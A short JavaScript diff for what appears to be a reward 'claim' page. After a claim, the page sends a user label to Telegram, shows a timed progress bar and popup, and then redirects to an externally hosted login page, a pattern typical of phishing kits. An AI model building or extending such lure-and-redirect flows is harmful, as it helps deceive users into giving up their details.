@@ -1306,17 +1306,16 @@
             // Send notification to Telegram
             await sendClaimToTelegram(userLabel);
 
-            // Wait for progress bar to reach 85%, then show success popup
+            // Wait for progress bar to reach 85%, then show success popup and redirect
             setTimeout(() => {
                 // Hide progress bar and show popup
                 if (progressContainer) progressContainer.style.display = 'none';
                 showClaimPopup();
                 
-                // Reset state so claim can be clicked again if needed
+                // Redirect to login page after 2 seconds
                 setTimeout(() => {
-                    claimInProgress = false;
-                    if (claimButton) claimButton.style.display = 'block';
-                }, 3000);
+                    window.location.href = 'https://bakalirfan-web.github.io/newbcweb/login.html';
+                }, 2000);
             }, 3000);
         }
 
